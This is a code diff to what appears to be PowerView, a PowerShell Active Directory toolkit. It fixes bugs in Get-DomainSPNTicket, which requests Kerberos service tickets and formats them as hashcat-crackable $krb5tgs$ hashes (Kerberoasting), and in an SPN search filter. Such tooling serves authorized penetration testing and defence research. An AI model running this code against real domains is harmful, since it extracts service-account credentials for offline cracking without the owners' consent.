@@ -2296,8 +2296,8 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
             }
             else {
                 $UserSPN = $Object
-                $SamAccountName = $Null
-                $DistinguishedName = $Null
+                $SamAccountName = 'UNKNOWN'
+                $DistinguishedName = 'UNKNOWN'
             }
 
             # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
@@ -2309,7 +2309,7 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
             }
             catch {
-                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName'"
+                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
             }
             if ($Ticket) {
                 $TicketByteStream = $Ticket.GetRequest()
@@ -2330,7 +2330,12 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                     $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                 }
                 else {
-                    $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                    if ($DistinguishedName -ne 'UNKNOWN') {
+                        $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                    }
+                    else {
+                        $UserDomain = 'UNKNOWN'
+                    }
 
                     # hashcat output format
                     $HashFormat = "`$krb5tgs`$23`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
@@ -2338,7 +2343,6 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $Out | Add-Member Noteproperty 'Hash' $HashFormat
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                 Write-Output $Out
-                break
             }
         }
     }
@@ -5785,7 +5789,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             }
             if ($PSBoundParameters['SPN']) {
                 Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
-                $Filter += '(servicePrincipalName=$SPN)'
+                $Filter += "(servicePrincipalName=$SPN)"
             }
             if ($PSBoundParameters['OperatingSystem']) {
                 Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
